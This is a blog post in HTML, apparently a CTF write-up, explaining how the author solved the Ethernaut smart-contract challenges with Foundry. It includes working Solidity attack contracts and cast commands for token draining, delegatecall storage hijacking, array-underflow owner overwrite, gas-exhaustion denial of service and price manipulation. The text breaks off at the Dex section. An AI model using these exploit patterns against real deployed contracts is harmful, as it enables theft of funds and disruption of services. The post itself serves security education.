@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  
+  
+  <title>Ethernaut Series: Part II</title>
+  <meta name="description" content="This is the second half of the Ethernaut series notes on how I solved each level using Foundry. For the first half, please see the previous post. The contracts deployed to solve the challenges, as well as test scripts, can be found on my Github.">
+  
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="https://axucar.ca/2022/09/14/ethernaut-series-2/">
+  
+  
+  <link rel="alternate" type="application/rss+xml" title="Carlos Xu" href="https://axucar.ca/feed.xml">
+
+  
+
+  
+  <meta property="og:title" content="Ethernaut Series: Part II">
+  <meta property="og:site_name" content="Carlos Xu">
+  <meta property="og:url" content="https://axucar.ca/2022/09/14/ethernaut-series-2/">
+  <meta property="og:description" content="This is the second half of the Ethernaut series notes on how I solved each level using Foundry. For the first half, please see the previous post. The contracts deployed to solve the challenges, as well as test scripts, can be found on my Github.">
+  
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="jekyllrb">
+  <meta name="twitter:title" content="Ethernaut Series: Part II">
+  <meta name="twitter:description" content="This is the second half of the Ethernaut series notes on how I solved each level using Foundry. For the first half, please see the previous post. The contracts deployed to solve the challenges, as ...">
+  
+    <meta name="twitter:creator" content="jekyllrb">
+  
+  
+
+  <link rel="dns-prefetch" href="https://fonts.gstatic.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bitter:ital,wght@0,400;0,700;1,400&amp;display=swap" rel="stylesheet">
+
+  
+
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Carlos Xu</a>
+
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/archives/">Archives</a>
+      
+        
+        <a class="page-link" href="https://github.com/axucar">GitHub</a>
+      
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    
+      <h1 class="post-title" itemprop="name headline">Ethernaut Series: Part II</h1>
+    
+    <p class="post-meta"><time datetime="2022-09-14T00:00:00+00:00" itemprop="datePublished">Sep 14, 2022</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <ul id="markdown-toc">
+  <li><a href="#naught-coin" id="markdown-toc-naught-coin">Naught Coin</a></li>
+  <li><a href="#preservation" id="markdown-toc-preservation">Preservation</a></li>
+  <li><a href="#recovery" id="markdown-toc-recovery">Recovery</a></li>
+  <li><a href="#magicnumber" id="markdown-toc-magicnumber">MagicNumber</a></li>
+  <li><a href="#alien-codex" id="markdown-toc-alien-codex">Alien Codex</a></li>
+  <li><a href="#denial" id="markdown-toc-denial">Denial</a></li>
+  <li><a href="#shop" id="markdown-toc-shop">Shop</a></li>
+  <li><a href="#dex" id="markdown-toc-dex">Dex</a></li>
+  <li><a href="#dextwo" id="markdown-toc-dextwo">DexTwo</a></li>
+  <li><a href="#puzzle-wallet" id="markdown-toc-puzzle-wallet">Puzzle Wallet</a></li>
+  <li><a href="#motorbike" id="markdown-toc-motorbike">Motorbike</a></li>
+  <li><a href="#doubleentrypoint" id="markdown-toc-doubleentrypoint">DoubleEntryPoint</a></li>
+  <li><a href="#good-samaritan" id="markdown-toc-good-samaritan">Good Samaritan</a></li>
+</ul>
+<p>This is the second half of the <a href="https://ethernaut.openzeppelin.com/">Ethernaut</a> series notes on how I solved each level using Foundry. For the first half, please see the <a href="http://axucar.ca/2022/09/13/ethernaut-series/">previous post</a>. The contracts deployed to solve the challenges, as well as test scripts, can be found on my <a href="https://github.com/axucar/ethernaut-foundry/">Github</a>.</p>
+
+<hr />
+<h1 id="naught-coin">Naught Coin</h1>
+
+<p>Since <code class="language-plaintext highlighter-rouge">NaughtCoin</code> is an <code class="language-plaintext highlighter-rouge">ERC20</code> token, we can use <code class="language-plaintext highlighter-rouge">transferFrom</code> instead of <code class="language-plaintext highlighter-rouge">transfer</code> (see <a href="https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#IERC20-transferFrom-address-address-uint256-">Openzeppelin docs</a>). Steps are:</p>
+<ul>
+  <li>Deploy attack contract below, which will send tokens via <code class="language-plaintext highlighter-rouge">transferFrom</code> from <code class="language-plaintext highlighter-rouge">msg.sender</code> to another arbitrary address (e.g. <code class="language-plaintext highlighter-rouge">0xA36f37e54180d59A9eC172d0f4A5F6c5Ba4F04A3</code> in my case)
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">forge create src/AttackNaughtCoin.sol:AttackNaughtCoin --verify --constructor-args &lt;challenge_addr&gt;</code></li>
+    </ul>
+  </li>
+  <li>Set a maximum allowance for the attacker to move funds on behalf of <code class="language-plaintext highlighter-rouge">player</code> by calling <code class="language-plaintext highlighter-rouge">contract.approve(spender,amount)</code> on the <code class="language-plaintext highlighter-rouge">NaughtCoin</code> contract from <code class="language-plaintext highlighter-rouge">player</code>, where we set <code class="language-plaintext highlighter-rouge">spender</code> to be the attacker contract we deployed
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">cast send &lt;challenge_addr&gt; "approve(address, uint256)" &lt;attacker_addr&gt; 1000000000000000000000000</code></li>
+      <li>Note that we cannot call <code class="language-plaintext highlighter-rouge">approve</code> from the attack contract, since <code class="language-plaintext highlighter-rouge">owner</code> is defined as <code class="language-plaintext highlighter-rouge">msg.sender</code> in the approve function of <code class="language-plaintext highlighter-rouge">ERC20.sol</code>, which needs to be <code class="language-plaintext highlighter-rouge">player</code> (since only player has the tokens). After approving the attack contract with the transfer rights, we can use the attacker contract to move the funds.</li>
+      <li>When we call <code class="language-plaintext highlighter-rouge">contract.transferFrom(player,to,amount)</code> inside the attack contract, it requires that <code class="language-plaintext highlighter-rouge">contract.allowance(player, msg.sender)</code> is large enough, ie. the signer <code class="language-plaintext highlighter-rouge">msg.sender</code> has the rights to move funds. In this case, <code class="language-plaintext highlighter-rouge">msg.sender</code> is the attack contract address</li>
+    </ul>
+  </li>
+  <li>Call <code class="language-plaintext highlighter-rouge">attack()</code> on the attack contract
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">cast send &lt;attacker_addr&gt; "attack()"</code></li>
+    </ul>
+  </li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+
+<span class="k">interface</span> <span class="n">INaughtCoin</span> <span class="p">{</span>
+    <span class="k">function</span> <span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">account</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+    <span class="k">function</span> <span class="n">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">spender</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+    <span class="k">function</span> <span class="n">transferFrom</span><span class="p">(</span>
+        <span class="kt">address</span> <span class="n">from</span><span class="p">,</span>
+        <span class="kt">address</span> <span class="n">to</span><span class="p">,</span>
+        <span class="kt">uint256</span> <span class="n">amount</span>
+    <span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>    
+    <span class="k">function</span> <span class="n">allowance</span><span class="p">(</span><span class="kt">address</span> <span class="n">owner</span><span class="p">,</span> <span class="kt">address</span> <span class="n">spender</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">contract</span> <span class="n">AttackNaughtCoin</span> <span class="p">{</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">victim</span><span class="p">;</span>
+    <span class="n">INaughtCoin</span> <span class="k">public</span> <span class="n">nc</span><span class="p">;</span>
+
+    <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_victim</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">victim</span> <span class="o">=</span> <span class="n">_victim</span><span class="p">;</span>        
+        <span class="n">nc</span> <span class="o">=</span> <span class="n">INaughtCoin</span><span class="p">(</span><span class="n">victim</span><span class="p">);</span>                
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">attack</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="c1">//beforehand, call NaughtCoin's approve(spender, amount) from msg.sender (the token holder)
+</span>        <span class="c1">//where spender is this attack contract, giving this contract permission to transfer out the player's tokens
+</span>        <span class="kt">uint256</span> <span class="n">maxTokens</span> <span class="o">=</span> <span class="n">nc</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">);</span>        
+        <span class="n">nc</span><span class="p">.</span><span class="n">transferFrom</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="mh">0xA36f37e54180d59A9eC172d0f4A5F6c5Ba4F04A3</span><span class="p">,</span> <span class="n">maxTokens</span><span class="p">);</span>        
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<hr />
+
+<h1 id="preservation">Preservation</h1>
+
+<p>The key is to notice that the storage variables layout between <code class="language-plaintext highlighter-rouge">Library Contract</code> and <code class="language-plaintext highlighter-rouge">Preservation</code> did not match, and <code class="language-plaintext highlighter-rouge">timeZone1Library</code> and <code class="language-plaintext highlighter-rouge">timeZone2Library</code> are both instances of <code class="language-plaintext highlighter-rouge">LibraryContract</code>. This is an issue since <code class="language-plaintext highlighter-rouge">timeZone1Library</code> executes a <code class="language-plaintext highlighter-rouge">delegatecall</code> within <code class="language-plaintext highlighter-rouge">setFirstTime()</code>, which allows <code class="language-plaintext highlighter-rouge">Preservation</code> storage variables to be modified using the code of <code class="language-plaintext highlighter-rouge">LibraryContract</code>.</p>
+<ul>
+  <li>Calling <code class="language-plaintext highlighter-rouge">setFirstTime()</code> supposedly sets <code class="language-plaintext highlighter-rouge">storedTime</code>. However, because <code class="language-plaintext highlighter-rouge">delegatecall</code> modifies the caller contract’s storage, <code class="language-plaintext highlighter-rouge">setFirstTime()</code> actually sets <code class="language-plaintext highlighter-rouge">timeZone1Library</code> since it is the first storage variable (as <code class="language-plaintext highlighter-rouge">storedTime</code> is also the first variable in storage in its corresponding environment). Hence, we can point <code class="language-plaintext highlighter-rouge">timeZone1Library</code> to our own <code class="language-plaintext highlighter-rouge">MaliciousLibrary</code> instance</li>
+  <li>Call the challenge contract’s <code class="language-plaintext highlighter-rouge">setFirstTime()</code> again, using any parameter (I chose 0), which we can use to set <code class="language-plaintext highlighter-rouge">owner=tx.origin</code>, again since <code class="language-plaintext highlighter-rouge">delegatecall</code> allows us to modify the <code class="language-plaintext highlighter-rouge">Preservation</code> contract’s storage</li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+
+<span class="k">contract</span> <span class="n">MaliciousLibrary</span> <span class="p">{</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">timeZone1Library</span><span class="p">;</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">timeZone2Library</span><span class="p">;</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span> 
+
+    <span class="k">function</span> <span class="n">setTime</span><span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="n">owner</span><span class="o">=</span><span class="n">tx</span><span class="p">.</span><span class="n">origin</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">interface</span> <span class="n">IPreservation</span> <span class="p">{</span>    
+    <span class="k">function</span> <span class="n">owner</span><span class="p">()</span> <span class="k">external</span> <span class="k">returns</span><span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+    <span class="k">function</span> <span class="n">setFirstTime</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_timeStamp</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>     
+<span class="p">}</span>
+
+<span class="k">contract</span> <span class="n">AttackPreservation</span> <span class="p">{</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">victim</span><span class="p">;</span>
+    <span class="n">IPreservation</span> <span class="k">public</span> <span class="n">p</span><span class="p">;</span>    
+    <span class="n">MaliciousLibrary</span> <span class="k">public</span> <span class="n">m</span><span class="p">;</span>
+
+    <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_victim</span><span class="p">)</span> <span class="p">{</span> 
+        <span class="n">victim</span> <span class="o">=</span> <span class="n">_victim</span><span class="p">;</span>   
+        <span class="n">m</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MaliciousLibrary</span><span class="p">();</span>                        
+        <span class="n">p</span> <span class="o">=</span> <span class="n">IPreservation</span><span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">setFirstTime</span><span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">m</span><span class="p">))));</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">setFirstTime</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<hr />
+<h1 id="recovery">Recovery</h1>
+
+<p>Of course, we can use Etherscan to look at the deployed SimpleToken contract under Internal Txs. The more interesting alternative is to deterministically compute the “forgotten” contract address based on the address of the creator (sender) and the number of transactions the creator has sent (nonce). These parameters, sender and nonce, are RLP encoded and hashed with Keccak256.</p>
+<ul>
+  <li>Keep only the rightmost 160 bits = 40 hex digits from the 2+64 = 66-length hex, and append 0x to the front, to get the deployed contract address</li>
+  <li>Below is the Javascript snippet (run <code class="language-plaintext highlighter-rouge">node snippet.js</code>):
+    <div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="na">encode</span> <span class="p">:</span> <span class="nx">rlp_encode</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">@ethersproject/rlp</span><span class="dl">"</span><span class="p">);</span>
+<span class="kd">const</span> <span class="p">{</span><span class="nx">keccak256</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">@ethersproject/keccak256</span><span class="dl">"</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">futureAddress</span><span class="o">=</span> <span class="nx">keccak256</span><span class="p">(</span><span class="nx">rlp_encode</span><span class="p">([</span><span class="dl">"</span><span class="s2">&lt;challenge_addr</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">0x01</span><span class="dl">"</span><span class="p">]));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">futureAddress</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">26</span><span class="p">,</span><span class="mi">66</span><span class="p">));</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Call selfdestroy of the recovered contract:<br />
+<code class="language-plaintext highlighter-rouge">cast send &lt;recovered_SimpleToken_addr&gt; "destroy(address)" &lt;any_to_addr&gt;</code></li>
+</ul>
+
+<hr />
+<h1 id="magicnumber">MagicNumber</h1>
+<p>We need to deploy contract that returns 42 in raw EVM bytecode. Recall that EVM interprets solidity source code files as bytecode, which is just sequence of hex characters. Bytecode is comprised of two different pieces: initialization (only executed at deployment, telling EVM to store remaining runtime code) and runtime code (permanently stored code on blockchain).</p>
+<ul>
+  <li><a href="https://www.evm.codes/">EVM Opcodes Reference</a></li>
+  <li><code class="language-plaintext highlighter-rouge">return 42</code> requires the value to be stored in memory not just the stack.
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">RETURN</code> is opcode <code class="language-plaintext highlighter-rouge">F3</code> taking two stack inputs: <code class="language-plaintext highlighter-rouge">(offset, size)</code></li>
+    </ul>
+  </li>
+  <li>Hence, the order of business is to run <code class="language-plaintext highlighter-rouge">MSTORE(position, value)</code> = <code class="language-plaintext highlighter-rouge">MSTORE(0x00,0x2a)</code>. Then, we want to run <code class="language-plaintext highlighter-rouge">RETURN(position=0, number of bytes=32)</code> = <code class="language-plaintext highlighter-rouge">RETURN(0x00,0x20)</code>
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">MSTORE</code> is opcode 52, which takes 2 stack inputs: position (0) and value (42=0x2a)</li>
+      <li><code class="language-plaintext highlighter-rouge">PUSH1</code> is opcode 60, stands for pushing 1 byte (2 hex characters) to the stack</li>
+      <li>Note the order of pushing params to stack: with stack data structure, last in first out (LIFO)</li>
+    </ul>
+  </li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">602</span><span class="n">a</span> <span class="c1">// PUSH1 0x2a
+</span><span class="mi">6000</span> <span class="c1">// PUSH1 0x00 (memory slot location offset)
+</span><span class="mi">52</span> <span class="c1">//MSTORE (position=0, value=42)
+</span>
+<span class="mi">6020</span> <span class="c1">//PUSH1 0x20 (value is 32 bytes for the size param)
+</span><span class="mi">6000</span> <span class="c1">// PUSH1 0x00 (memory slot location offset)
+</span><span class="n">f3</span> <span class="c1">//RETURN (position=0, number of bytes=32)
+</span></code></pre></div></div>
+
+<p>Therefore, Runtime opcode sequence in hex : <code class="language-plaintext highlighter-rouge">0x602a60005260206000f3</code></p>
+
+<ul>
+  <li>20 hex digits = 10 bytes</li>
+  <li>this bytecode represents a contract that returns 0x2a</li>
+</ul>
+
+<p>Now for the full <strong>contract creation</strong> code: we have two components:</p>
+<ul>
+  <li>store in memory the 10 bytes of runtime bytecode from above<br />
+<code class="language-plaintext highlighter-rouge">MSTORE(0, 0x602a60005260206000f3)</code>
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">PUSH10</code> is opcode 69, which is needed to push the 10bytes of <code class="language-plaintext highlighter-rouge">0x602a60005260206000f3</code> to the stack</li>
+      <li>Since solidity memory slots are 32 bytes, this will pad with 22 zeroes on the left</li>
+    </ul>
+  </li>
+  <li>return the runtime bytecode: <code class="language-plaintext highlighter-rouge">RETURN(offset=22,size=10)</code> = <code class="language-plaintext highlighter-rouge">RETURN(0x16, 0x0a)</code>
+    <ul>
+      <li>Recall <code class="language-plaintext highlighter-rouge">RETURN</code> is opcode <code class="language-plaintext highlighter-rouge">F3</code> taking two stack inputs: <code class="language-plaintext highlighter-rouge">(offset, size)</code></li>
+    </ul>
+  </li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//MSTORE runtime bytecode
+</span><span class="mi">69602</span><span class="n">a60005260206000f3</span> <span class="c1">// PUSH10(value=0x602a60005260206000f3) 
+</span><span class="mi">6000</span> <span class="c1">// PUSH1 0x00 (position to store bytecode)
+</span><span class="mi">52</span> <span class="c1">// MSTORE(position=0, size=10 bytes)
+//RETURN
+</span><span class="mi">600</span><span class="n">a</span> <span class="c1">//PUSH1 0x0a (size is 10bytes)
+</span><span class="mi">6016</span> <span class="c1">//PUSH1 0x16 (position offset=22)
+</span><span class="n">f3</span> <span class="c1">// return(position=22, size=10 bytes)
+</span></code></pre></div></div>
+
+<p>To summarize, the full contract creation opcode sequence in hex : <code class="language-plaintext highlighter-rouge">0x69602a60005260206000f3600052600a6016f3</code></p>
+
+<p>To deploy this raw bytecode in foundry, I needed to call <code class="language-plaintext highlighter-rouge">foundryup</code> in the terminal to get the most recent nightly build, to ensure we have the new feature that allows deploying raw contract bytecode with <code class="language-plaintext highlighter-rouge">cast send --create</code> (ie. when <code class="language-plaintext highlighter-rouge">to</code> destination of transaction is not specified). See the merged Github PR <a href="https://github.com/foundry-rs/foundry/pull/2871">here</a>.</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">cast send --create &lt;raw_bytecode_above&gt;</code></li>
+  <li>Using <code class="language-plaintext highlighter-rouge">web3</code> library in Javascript, the equivalent command is:<br />
+<code class="language-plaintext highlighter-rouge">web3.eth.sendTransaction({ data: '0x69602a60005260206000f3600052600a6016f3' })</code></li>
+  <li>In Etherscan, under the contract tab, we should see that the bytecode is only the runtime bytecode left.</li>
+</ul>
+
+<p><a href="/assets/etherscan-rawbyte.png"><img src="/assets/etherscan-rawbyte.png" alt="etherscan-screenshot" /></a></p>
+
+<p>To finish the level:<br />
+<code class="language-plaintext highlighter-rouge">cast send &lt;challenge_addr&gt; "setSolver(address)" &lt;deployed_contract_from_rawbytecode&gt;</code></p>
+
+<hr />
+<h1 id="alien-codex">Alien Codex</h1>
+
+<p>This level tests knowledge of the storage layout of a smart contract (see <a href="https://docs.soliditylang.org/en/v0.8.15/internals/layout_in_storage.html">docs</a>).</p>
+<ul>
+  <li>2^256 - 1 slots (as many slots as there are possible hashes)</li>
+  <li>32 bytes of data per slot</li>
+</ul>
+
+<p>Since <code class="language-plaintext highlighter-rouge">AlienCodex</code> is <code class="language-plaintext highlighter-rouge">Ownable</code>, the first variable to be stored is <code class="language-plaintext highlighter-rouge">owner</code> (address are 20 bytes) from Ownable contract. Next, the bool <code class="language-plaintext highlighter-rouge">contact</code> variable can still fit in the same first slot. Both are statically sized variables.</p>
+
+<p>For dynamic arrays, specifically <code class="language-plaintext highlighter-rouge">codex</code> in this case, let the next slot position be <code class="language-plaintext highlighter-rouge">p,</code> which will store the number of elements in the array, ie. <code class="language-plaintext highlighter-rouge">array.length</code>. Then, actual array data is at <code class="language-plaintext highlighter-rouge">keccak256(p)</code> (so that it won’t be overwriting anything existing when we expand the dynamic array). So <code class="language-plaintext highlighter-rouge">array[0]</code> is stored at <code class="language-plaintext highlighter-rouge">keccak256(p)</code>, <code class="language-plaintext highlighter-rouge">array[1]</code> is <code class="language-plaintext highlighter-rouge">keccak256(p)+1</code>, and so on.</p>
+
+<p>The key vulnerability of this contract is allowing modifying the dynamic array length without checking for over/underflow, which allows us to set the array bounds to cover the entire storage area. This allows us to modify any part of the contract storage.</p>
+
+<p>In this challenge: we have the following storage slot layout</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Slot</th>
+      <th>Variable Stored</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>0</td>
+      <td><code class="language-plaintext highlighter-rouge">owner</code> and <code class="language-plaintext highlighter-rouge">contact</code></td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>codex.length</td>
+    </tr>
+    <tr>
+      <td>keccak(1)</td>
+      <td>codex[0]</td>
+    </tr>
+    <tr>
+      <td>keccak(1)+1</td>
+      <td>codex[1]</td>
+    </tr>
+    <tr>
+      <td>…</td>
+      <td>…</td>
+    </tr>
+    <tr>
+      <td>2^256 - 1</td>
+      <td>codex[2^256 - 1 - uint(keccak(1))]</td>
+    </tr>
+    <tr>
+      <td>0 (overflow, can overwrite!)</td>
+      <td>codex[2^256 - 1 - uint(keccak(1)) + 1]</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>We can thus deploy an attacker contract with the following steps:</p>
+<ol>
+  <li>call <code class="language-plaintext highlighter-rouge">make_contact</code></li>
+  <li>call <code class="language-plaintext highlighter-rouge">retract</code>  which causes underflow from 0 and leads to code.length = 2^256 - 1</li>
+  <li>Now that <code class="language-plaintext highlighter-rouge">codex</code> length is maximally large, we can index into the slot that overwrites slot 0.
+    <ul>
+      <li>Slot i corresponds to <code class="language-plaintext highlighter-rouge">codex</code> array indexed at  <code class="language-plaintext highlighter-rouge">i - keccak256(1)</code>, so slot 0 = <code class="language-plaintext highlighter-rouge">2^256 - 1 - keccak256(1) + 1</code></li>
+    </ul>
+  </li>
+  <li>call <code class="language-plaintext highlighter-rouge">revise</code> with the correct index <code class="language-plaintext highlighter-rouge">i</code> and your address converted to <code class="language-plaintext highlighter-rouge">bytes32</code></li>
+</ol>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">attack</span> <span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">IAlienCodex</span><span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+    <span class="n">a</span><span class="p">.</span><span class="n">make_contact</span><span class="p">();</span>
+    <span class="n">a</span><span class="p">.</span><span class="n">retract</span><span class="p">();</span>        
+    <span class="n">a</span><span class="p">.</span><span class="n">revise</span><span class="p">((</span><span class="mi">2</span><span class="o">**</span><span class="mi">256</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="kt">uint</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="n">abi</span><span class="p">.</span><span class="n">encodePacked</span><span class="p">(</span><span class="kt">uint</span><span class="p">(</span><span class="mi">1</span><span class="p">))))</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span><span class="kt">bytes32</span><span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">))));</span>        
+<span class="p">}</span>
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="denial">Denial</h1>
+<p>Key: Since the <code class="language-plaintext highlighter-rouge">withdraw</code> function uses <code class="language-plaintext highlighter-rouge">call</code> to send ETH, we can use reentrancy and implement a fallback function within our attack contract which consumes all the gas. Hence, there will be no gas left for <code class="language-plaintext highlighter-rouge">owner.transfer(amountToSend)</code>. This is a DoS (denial of service) attack.</p>
+
+<p>The lesson here is that using <code class="language-plaintext highlighter-rouge">call</code> instead of <code class="language-plaintext highlighter-rouge">send</code> or <code class="language-plaintext highlighter-rouge">transfer</code> can introduce vulnerabilities.</p>
+
+<p>With reentrancy, recall the check-effect-interact paradigm (in the <code class="language-plaintext highlighter-rouge">Denial</code> contract, there is no check for available balances, and the low-level <code class="language-plaintext highlighter-rouge">call</code>, which allows reentrancy, occurs before the effect of updating balances (classic reentrancy attack setup).</p>
+
+<p>To deny the owner’s withdrawal:</p>
+
+<ol>
+  <li>
+    <p>deploy an attack contract with fallback function that consumes nearly all the gas</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> receive() external payable {        
+         while(true){}
+     }
+</code></pre></div>    </div>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">setWithdrawPartner</code> to be this attack contract</li>
+  <li>call <code class="language-plaintext highlighter-rouge">Denial</code> contract’s <code class="language-plaintext highlighter-rouge">withdraw()</code> to confirm that it indeed runs out of gas</li>
+</ol>
+
+<p>Note that it will still work with sufficiently large amount of gas (2.3M gas and above worked for me), while challenge assumes 1M maximum gas.</p>
+
+<ul>
+  <li>By default Foundry’s <code class="language-plaintext highlighter-rouge">cast</code> gave gas limit of 3.4M to withdraw function (so owner still got the drip funds, and was not denied)</li>
+  <li><code class="language-plaintext highlighter-rouge">cast send &lt;challenge_addr&gt; "withdraw()" --gas-limit 1000000</code> does deny the drip for both parties (out of gas error for both drips)</li>
+  <li>Perhaps external <code class="language-plaintext highlighter-rouge">call</code> is not actually allowed to forward all 100% of the gas available, although I couldn’t find official documentation on this</li>
+</ul>
+
+<hr />
+<h1 id="shop">Shop</h1>
+<p>Since <code class="language-plaintext highlighter-rouge">price()</code> of the <code class="language-plaintext highlighter-rouge">Buyer</code> interface is not actually implemented, it will resort to the definition of our attacker contract</p>
+<ul>
+  <li>It’s unsafe to change the state (<code class="language-plaintext highlighter-rouge">price</code> in this case) based on external, untrusted contracts logic</li>
+</ul>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">contract</span> <span class="n">AttackShop</span><span class="p">{</span>        
+    <span class="n">IShop</span> <span class="k">public</span> <span class="n">shop</span><span class="p">;</span>
+    <span class="kt">uint</span> <span class="n">timesCalled</span><span class="p">;</span> 
+
+    <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_victim</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">shop</span> <span class="o">=</span> <span class="n">IShop</span><span class="p">(</span><span class="n">_victim</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">price</span><span class="p">()</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="p">{</span>    
+        <span class="k">return</span> <span class="n">shop</span><span class="p">.</span><span class="n">isSold</span><span class="p">()</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="mi">300</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="n">attack</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>        
+        <span class="n">shop</span><span class="p">.</span><span class="n">buy</span><span class="p">();</span>                
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<hr />
+<h1 id="dex">Dex</h1>
+
+<p>Firstly, a quick note on importing OpenZeppelin contracts in Solidity using foundry.</p>
